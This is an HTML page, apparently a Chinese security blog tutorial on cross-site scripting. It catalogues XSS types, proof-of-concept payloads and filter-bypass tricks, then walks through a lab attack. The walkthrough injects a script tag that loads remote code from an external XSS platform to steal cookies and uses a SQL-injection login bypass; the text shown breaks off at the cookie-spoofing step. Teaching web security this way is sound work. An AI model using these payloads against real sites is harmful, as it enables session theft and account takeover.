@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    
+
+    
+<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>
+    
+
+<meta charset="utf-8" >
+
+<title>XSS 跨站脚本攻击</title>
+<meta name="keywords" content="XSS 跨站脚本攻击, 安全,渗透测试,应急响应,漏洞分析,安全运维">
+<meta name="description" content="
+一、概述1.1 是什么跨站脚本攻击（Cross-Site Scripting），由于与 CSS 重名，更名为 XSS。本质是客户端代码注入——攻击者在合法网站中注入恶意脚本，用户访问被注入的页面时，浏览器解析并执行这段 JS。
+XSS 用">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="XSS 跨站脚本攻击">
+<meta property="og:description" content="
+一、概述1.1 是什么跨站脚本攻击（Cross-Site Scripting），由于与 CSS 重名，更名为 XSS。本质是客户端代码注入——攻击者在合法网站中注入恶意脚本，用户访问被注入的页面时，浏览器解析并执行这段 JS。
+XSS 用">
+
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="stylesheet" href="/style/main.css">
+
+  <link rel="stylesheet" href="/style/simple-lightbox.min.css"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="54ury" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="54ury" type="application/rss+xml">
+</head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      
+      
+      <a href="https://z50n6.github.io" class="no-avatar">
+        <h1 class="site-title">54ury</h1>
+      </a>
+    </div>
+    <div class="right">
+        
+        <button type="button" class="theme-switch" id="theme-switch" aria-label="切换亮色/暗色主题" title="切换主题">
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true">
+            <circle cx="12" cy="12" r="4"></circle>
+            <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"></path>
+          </svg>
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"></path>
+          </svg>
+        </button>
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<script>
+  // 手动切换亮/暗：写入 html.dark 并记忆到 use-color-scheme（与 head.ejs 的读取键一致）
+  (function () {
+    var btn = document.getElementById('theme-switch');
+    if (!btn) return;
+    btn.addEventListener('click', function () {
+      var isDark = document.documentElement.classList.toggle('dark');
+      try { localStorage.setItem('use-color-scheme', isDark ? 'dark' : 'light'); } catch (e) {}
+    });
+  })();
+</script>
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+    
+      <a href="/" class="menu purple-link">
+        首页
+      </a>
+    
+  
+    
+      <a href="/tags/" class="menu purple-link">
+        标签
+      </a>
+    
+  
+    
+      <a href="/categories/" class="menu purple-link">
+        分类
+      </a>
+    
+  
+    
+      <a href="/archives/" class="menu purple-link">
+        归档
+      </a>
+    
+  
+    
+      <a href="/about/" class="menu purple-link">
+        关于
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">XSS 跨站脚本攻击</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2026-06-28</span>
+        
+          <span>
+          <i class="icon icon-pricetags-outline"></i>
+            
+              <a href="/tags/WEB%E6%B8%97%E9%80%8F/">
+              WEB渗透
+                
+                  ，
+                
+              </a>
+            
+              <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
+              基础漏洞
+                
+              </a>
+            
+          </span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <hr>
+<h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><h3 id="1-1-是什么"><a href="#1-1-是什么" class="headerlink" title="1.1 是什么"></a>1.1 是什么</h3><p>跨站脚本攻击（Cross-Site Scripting），由于与 CSS 重名，更名为 XSS。本质是<strong>客户端代码注入</strong>——攻击者在合法网站中注入恶意脚本，用户访问被注入的页面时，浏览器解析并执行这段 JS。</p>
+<p>XSS 用 JavaScript 完成攻击。JS 可以灵活操纵 HTML、CSS、浏览器，给了 XSS 极大的攻击面。</p>
+<h3 id="1-2-攻击原理"><a href="#1-2-攻击原理" class="headerlink" title="1.2 攻击原理"></a>1.2 攻击原理</h3><p>三个角色参与：</p>
+<blockquote>
+<p>服务器 → 攻击者 → 客户端浏览器用户</p>
+</blockquote>
+<pre class="mermaid">sequenceDiagram
+    participant A as 攻击者
+    participant S as 服务器
+    participant V as 受害者浏览器
+
+    A->>S: ① 提交恶意脚本（留言/评论/参数注入）
+    Note over S: ② 恶意脚本被存入数据库<br>或嵌入响应页面
+    V->>S: ③ 受害者访问含脚本的页面
+    S-->>V: ④ 返回含恶意脚本的页面
+    Note over V: ⑤ 浏览器解析并执行脚本
+    V-->>A: ⑥ Cookie / 敏感数据被外带
+    Note over A: ⑦ 攻击者劫持会话 / 钓鱼 / 蠕虫</pre>
+
+<blockquote>
+<p>核心：攻击者写，受害者读，浏览器执行——攻击者全程不需要直接接触受害者。</p>
+</blockquote>
+<p>搜索框、登录框、留言板、聊天室——一切收集用户输入的地方都可能被注入 XSS 代码。XSS 需要等待受害者访问被注入的页面，比较被动，所以又叫”盲打”。</p>
+<h3 id="1-3-漏洞危害"><a href="#1-3-漏洞危害" class="headerlink" title="1.3 漏洞危害"></a>1.3 漏洞危害</h3><ul>
+<li>网络钓鱼，获取各类用户账号</li>
+<li>窃取 Cookie，获取隐私信息或冒充受害者操作</li>
+<li>劫持会话，执行任意操作（转账、发帖等）</li>
+<li>强制弹出广告、刷流量</li>
+<li>网页挂马</li>
+<li>篡改页面、删除文章</li>
+<li>大量客户端攻击（如 DDoS）</li>
+<li>获取客户端信息（浏览历史、真实 IP、开放端口）</li>
+<li>控制受害者机器向其他网站发起攻击</li>
+<li>结合 CSRF 扩大危害</li>
+<li>提升权限，进一步渗透</li>
+<li>传播跨站脚本蠕虫</li>
+</ul>
+<h3 id="1-4-PoC-验证"><a href="#1-4-PoC-验证" class="headerlink" title="1.4 PoC 验证"></a>1.4 PoC 验证</h3><p>渗透测试中验证 XSS 的最简 payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>);&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&#x27;xss&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">prompt</span>(<span class="string">&#x27;xss&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二、漏洞分类"><a href="#二、漏洞分类" class="headerlink" title="二、漏洞分类"></a>二、漏洞分类</h2><h3 id="2-1-反射型-XSS"><a href="#2-1-反射型-XSS" class="headerlink" title="2.1 反射型 XSS"></a>2.1 反射型 XSS</h3><pre class="mermaid">flowchart LR
+    A[攻击者] -->|"① 构造恶意链接"| V[受害者]
+    V -->|"② 点击(带payload)"| S[服务器]
+    S -->|"③ 响应中直接回显payload"| V
+    V -->|"④ 浏览器执行脚本"| A</pre>
+
+<p>非持久性、参数型。XSS 代码出现在 URL 参数中，每次触发都需要受害者点击带 payload 的链接。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cms/search.php?keywords=%3Cscript%3Ealert(/xss/)%3C/script%3E</span><br></pre></td></tr></table></figure>
+
+<p>容易被发现，利用难度高，很多漏洞平台不收。</p>
+<h3 id="2-2-存储型-XSS"><a href="#2-2-存储型-XSS" class="headerlink" title="2.2 存储型 XSS"></a>2.2 存储型 XSS</h3><pre class="mermaid">flowchart LR
+    A[攻击者] -->|"① 提交恶意脚本"| S[服务器]
+    S -->|"② 存入数据库"| DB[(数据库)]
+    V[受害者] -->|"③ 正常访问页面"| S
+    S -->|"④ 从DB读取并返回含脚本页面"| V
+    V -->|"⑤ 浏览器执行脚本"| A</pre>
+
+<p>持久性——XSS 代码写进<strong>数据库或文件</strong>。通常发生在留言板、评论区。用户提交恶意内容 → 存入数据库 → 任何人访问该页面即触发。</p>
+<p>危害面广，漏洞平台通常收此类。</p>
+<h3 id="2-3-DOM-型-XSS"><a href="#2-3-DOM-型-XSS" class="headerlink" title="2.3 DOM 型 XSS"></a>2.3 DOM 型 XSS</h3><pre class="mermaid">flowchart LR
+    A[攻击者] -->|"① 构造恶意链接(#锚点)"| V[受害者]
+    V -->|"② 点击链接"| S[服务器]
+    S -->|"③ 返回正常页面<br>(不含恶意代码)"| V
+    V -->|"④ 前端JS读取#后面内容并操作DOM"| V
+    V -->|"⑤ 脚本在浏览器端执行"| A</pre>
+
+<p>通过<strong>修改浏览器本地 DOM 树</strong>触发，payload 不上传到服务器。常用 <code>#</code> 锚点传参，参数不提交到服务端，导致 DOM 型 XSS 难以检测。</p>
+<h3 id="2-4-mXSS（突变型）"><a href="#2-4-mXSS（突变型）" class="headerlink" title="2.4 mXSS（突变型）"></a>2.4 mXSS（突变型）</h3><p>Payload 提交时无害，但由于反编码、解析差异等原因发生”变异”，最终产生 XSS。典型场景：富文本过滤器中 <code>innerHTML</code> 赋值导致 payload 变形。</p>
+<h3 id="2-5-UXSS（通用型）"><a href="#2-5-UXSS（通用型）" class="headerlink" title="2.5 UXSS（通用型）"></a>2.5 UXSS（通用型）</h3><p>Universal XSS——利用<strong>浏览器或浏览器扩展自身的漏洞</strong>来制造 XSS 条件。可以理解为绕过同源策略，不限于单个网站。</p>
+<h3 id="2-6-Flash-XSS"><a href="#2-6-Flash-XSS" class="headerlink" title="2.6 Flash XSS"></a>2.6 Flash XSS</h3><p>SWF 文件中与 JS 交互的两个关键点：</p>
+<ul>
+<li><code>getURL</code> &#x2F; <code>navigateToURL</code> — 访问跳转</li>
+<li><code>ExternalInterface.call</code> — 调用 JS 函数</li>
+</ul>
+<p>白盒：反编译 swf → 搜 <code>ExternalInterface.call</code> → 看是否有可控参数传入。<br>黑盒：扫描路径 → 找 <code>.swf</code> 文件 → 下载反编译看源码。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/44299.html">Flash XSS 攻击总结</a></p>
+<h3 id="2-7-UTF-7-XSS"><a href="#2-7-UTF-7-XSS" class="headerlink" title="2.7 UTF-7 XSS"></a>2.7 UTF-7 XSS</h3><p>仅在低版本 IE 触发。meta 未指定编码时，特定 IE 发现 UTF-7 内容自动解码；或编码被指定为 UTF-7。</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225140933613.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225140933613.png"  alt="UTF-7 XSS" lazyload></a></p>
+<p>图中 <code>a</code> 变量的值就是 UTF-7 编码后的正常 XSS payload。</p>
+<h3 id="2-8-MHTML-XSS"><a href="#2-8-MHTML-XSS" class="headerlink" title="2.8 MHTML XSS"></a>2.8 MHTML XSS</h3><p>同样仅低版本 IE。MHTML 是多附件网页内容的单一档案标准。当嵌入资源的协议为 <code>mhtml:</code> 时，IE 用 MHTML Protocol Handler 解析。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Content-Type:multipart/related;boundary=&quot;x&quot;</span><br><span class="line">--x</span><br><span class="line">Content-Location:xss</span><br><span class="line">Content-Transfer-Encoding:base64</span><br><span class="line">PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</span><br><span class="line">--x--</span><br></pre></td></tr></table></figure>
+
+<p><code>PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</code> 解码 → <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p>通过 <code>mhtml:www.x.com/a.html!xss</code> 访问触发。</p>
+<h3 id="2-9-CSS-XSS"><a href="#2-9-CSS-XSS" class="headerlink" title="2.9 CSS XSS"></a>2.9 CSS XSS</h3><p>IE8 Beta2 以前支持 CSS 中使用 <code>expression</code> 定义表达式：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">width</span>:<span class="built_in">expression</span>(<span class="built_in">alert</span>(<span class="number">1</span>))&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-10-VBScript-XSS"><a href="#2-10-VBScript-XSS" class="headerlink" title="2.10 VBScript XSS"></a>2.10 VBScript XSS</h3><p>已淘汰的微软产物：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onClick</span>=<span class="string">&quot;VBScript:Document.Write &#x27;hello&#x27;</span></span></span><br><span class="line"><span class="string"><span class="tag">MsgBox &#x27;xss&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>UTF-7 XSS、MHTML XSS、CSS XSS、VBScript XSS 已是历史的产物，只在 IE 低版本触发。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4067">先知社区</a></p>
+</blockquote>
+<hr>
+<h2 id="三、XSS-构造"><a href="#三、XSS-构造" class="headerlink" title="三、XSS 构造"></a>三、XSS 构造</h2><h3 id="3-1-利用"><a href="#3-1-利用" class="headerlink" title="3.1 利用 &lt; &gt;"></a>3.1 利用 <code>&lt; &gt;</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=2866847033,2297252904&amp;fm=26&amp;gp=0.jpg&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-JavaScript-伪协议"><a href="#3-2-JavaScript-伪协议" class="headerlink" title="3.2 JavaScript 伪协议"></a>3.2 JavaScript 伪协议</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;click me!&lt;/a&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span> <span class="comment">&lt;!-- IE6 --&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-事件响应"><a href="#3-3-事件响应" class="headerlink" title="3.3 事件响应"></a>3.3 事件响应</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">PortSwigger XSS Cheat Sheet</a></p>
+<table>
+<thead>
+<tr>
+<th>事件类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Keyboard 事件</td>
+<td>键盘事件</td>
+</tr>
+<tr>
+<td>Mouse 事件</td>
+<td>鼠标事件</td>
+</tr>
+<tr>
+<td>Media 事件</td>
+<td>多媒体触发的事件</td>
+</tr>
+<tr>
+<td>Form 事件</td>
+<td>HTML 表单内触发的事件</td>
+</tr>
+<tr>
+<td>Window 事件</td>
+<td>对 window 对象触发的事件</td>
+</tr>
+</tbody></table>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&#x27;#&#x27;</span> onmouseover=<span class="string">&#x27;alert(/dont touch me!/)&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&#x27;text&#x27; onkeydown=&#x27;alert(/xss/)&#x27;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&#x27;text&#x27; onkeyup=&#x27;alert(/xss/)&#x27;&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=&#x27;alert(/xss/)&#x27;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=alert(/xss/) autofocus&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、XSS-绕过与变形"><a href="#四、XSS-绕过与变形" class="headerlink" title="四、XSS 绕过与变形"></a>四、XSS 绕过与变形</h2><p>假设 CMS 搜索框存在反射 XSS，防护代码的过滤逻辑如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$keyword</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;keywords&#x27;</span>];</span><br><span class="line"><span class="comment">// $keyword = str_replace(&quot;&lt;script&gt;&quot;, &quot;&quot;, $keyword);</span></span><br><span class="line"><span class="comment">// $keyword = preg_replace(&quot;/&lt;script&gt;/i&quot;, &quot;&quot;, $keyword);</span></span><br><span class="line"><span class="variable">$keyword</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$keyword</span>);</span><br><span class="line"><span class="comment">// $keyword = str_replace(&quot;on&quot;, &quot;o_n&quot;, $keyword);</span></span><br><span class="line"><span class="variable">$keyword</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/on/i&quot;</span>, <span class="string">&quot;o_n&quot;</span>, <span class="variable">$keyword</span>);</span><br><span class="line"><span class="comment">// $keyword = str_replace(&quot;&lt;&quot;, &quot;&quot;, $keyword);</span></span><br><span class="line"><span class="comment">// $keyword = str_replace(&quot;&gt;&quot;, &quot;&quot;, $keyword);</span></span><br><span class="line"><span class="variable">$keyword</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$keyword</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$keyword</span>;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在加过滤之前，访问 <code>?keywords=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code> 直接弹框，证明漏洞存在。下面的绕过手法就是针对逐步加过滤后的对抗。</p>
+</blockquote>
+<h3 id="4-1-大小写转换"><a href="#4-1-大小写转换" class="headerlink" title="4.1 大小写转换"></a>4.1 大小写转换</h3><p>浏览器对 HTML 标签大小写不敏感：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">ScRiPt</span>&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">ONerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-关键字双写"><a href="#4-2-关键字双写" class="headerlink" title="4.2 关键字双写"></a>4.2 关键字双写</h3><p>绕过一次性替换：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-伪协议转码"><a href="#4-3-伪协议转码" class="headerlink" title="4.3 伪协议转码"></a>4.3 伪协议转码</h3><table>
+<thead>
+<tr>
+<th>字母</th>
+<th>ASCII</th>
+<th>十进制</th>
+<th>十六进制</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>a</td>
+<td>97</td>
+<td><code>&amp;#97;</code></td>
+<td><code>&amp;#x61;</code></td>
+</tr>
+<tr>
+<td>c</td>
+<td>99</td>
+<td><code>&amp;#99;</code></td>
+<td><code>&amp;#x63;</code></td>
+</tr>
+<tr>
+<td>e</td>
+<td>101</td>
+<td><code>&amp;#101;</code></td>
+<td><code>&amp;#x65;</code></td>
+</tr>
+</tbody></table>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(/xss/)&#x27;</span>&gt;demo&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其他编码：UTF-8、UTF-7。</p>
+<h3 id="4-4-插入特殊字符"><a href="#4-4-插入特殊字符" class="headerlink" title="4.4 插入特殊字符"></a>4.4 插入特殊字符</h3><table>
+<thead>
+<tr>
+<th>字符</th>
+<th>编码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Tab</td>
+<td><code>&amp;#9;</code></td>
+</tr>
+<tr>
+<td>换行</td>
+<td><code>&amp;#10;</code></td>
+</tr>
+<tr>
+<td>回车</td>
+<td><code>&amp;#13;</code></td>
+</tr>
+<tr>
+<td>SOH</td>
+<td><code>&amp;#01;</code></td>
+</tr>
+<tr>
+<td>STX</td>
+<td><code>&amp;#02;</code></td>
+</tr>
+</tbody></table>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;j&amp;#9;avasc&amp;#10;r&amp;#13;ipt:alert(/xss/)&#x27;</span>&gt;click me!&lt;/a&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;<span class="symbol">&amp;#01;</span><span class="symbol">&amp;#02;</span>j<span class="symbol">&amp;#9;</span>avasc<span class="symbol">&amp;#10;</span>r<span class="symbol">&amp;#13;</span>ipt:alert(/xss/)&#x27;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-5-引号绕过"><a href="#4-5-引号绕过" class="headerlink" title="4.5 引号绕过"></a>4.5 引号绕过</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Img</span> sRc=# <span class="title class_">OnErRoR</span>=<span class="title function_">alert</span>(<span class="regexp">/xss/</span>);&gt;</span><br><span class="line">&lt;Img sRc=&#x27;#&#x27; OnErRoR=&#x27;alert(/xss/)&#x27;&gt;</span><br><span class="line">&lt;Img sRc=&quot;#&quot; OnErRoR=&quot;alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-6-代替空格"><a href="#4-6-代替空格" class="headerlink" title="4.6 / 代替空格"></a>4.6 <code>/</code> 代替空格</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Img</span>/sRc=<span class="string">&#x27;#&#x27;</span>/<span class="title class_">OnErRoR</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-7-拆分跨站"><a href="#4-7-拆分跨站" class="headerlink" title="4.7 拆分跨站"></a>4.7 拆分跨站</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=<span class="string">&#x27;alert&#x27;</span>&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z+=<span class="string">&#x27;(/xss/)&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(z)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、XSS-利用实战"><a href="#五、XSS-利用实战" class="headerlink" title="五、XSS 利用实战"></a>五、XSS 利用实战</h2><h3 id="5-1-Cookie-劫持-XSS-平台"><a href="#5-1-Cookie-劫持-XSS-平台" class="headerlink" title="5.1 Cookie 劫持 + XSS 平台"></a>5.1 Cookie 劫持 + XSS 平台</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ic-H6cYumaOY5vkyZCnGkg">CMS 靶场 提取码：xcuw</a></p>
+</blockquote>
+<p>用户会话通过 Cookie 实现，XSS 用 JS 可以直接读 <code>document.cookie</code>。由于需要受害者参与，攻击者不知道何时触发——叫 <strong>XSS 盲打</strong>。用 <strong>XSS 平台</strong> 收 Cookie。</p>
+<p>XSS 平台：<a target="_blank" rel="noopener" href="https://xss.pt/">https://xss.pt/</a></p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20230826192625919.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20230826192625919.png"  alt="XSS 平台1" lazyload></a><br><a class="simple-lightbox" href="/imgs/xss/image-20230826192647445.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20230826192647445.png"  alt="XSS 平台2" lazyload></a><br><a class="simple-lightbox" href="/imgs/xss/image-20230826192711317.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20230826192711317.png"  alt="XSS 平台3" lazyload></a><br><a class="simple-lightbox" href="/imgs/xss/image-20230826192859117.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20230826192859117.png"  alt="XSS 平台4" lazyload></a></p>
+<p>注入平台生成的 payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt sRC=<span class="comment">//0x.ax/Z2mua2&gt;&lt;/sCrIpT&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a class="simple-lightbox" href="/imgs/xss/image-20230826193143382.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20230826193143382.png"  alt="注入 XSS" lazyload></a><br><a class="simple-lightbox" href="/imgs/xss/image-20230826193151630.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20230826193151630.png"  alt="注入成功" lazyload></a></p>
+<p>用万能用户名进入后台：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">li<span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>
+
+<p><a class="simple-lightbox" href="/imgs/xss/image-20230826193245925.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20230826193245925.png"  alt="万能密码" lazyload></a><br><a class="simple-lightbox" href="/imgs/xss/image-20230826193307606.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20230826193307606.png"  alt="登录成功" lazyload></a></p>
+<p>查看留言消息：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20230826193336199.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20230826193336199.png"  alt="留言消息" lazyload></a></p>
+<p>XSS 平台收到 Cookie：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20230826193438840.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20230826193438840.png"  alt="XSS平台收到Cookie" lazyload></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie: username=li%27 or 1%3D1%23; userid=1</span><br></pre></td></tr></table></figure>
+
+<p><strong>Cookie 欺骗登录：</strong></p>
+<p>F12 打开控制台：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20230826193611677.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20230826193611677.png"  alt="控制台" lazyload></a></p>
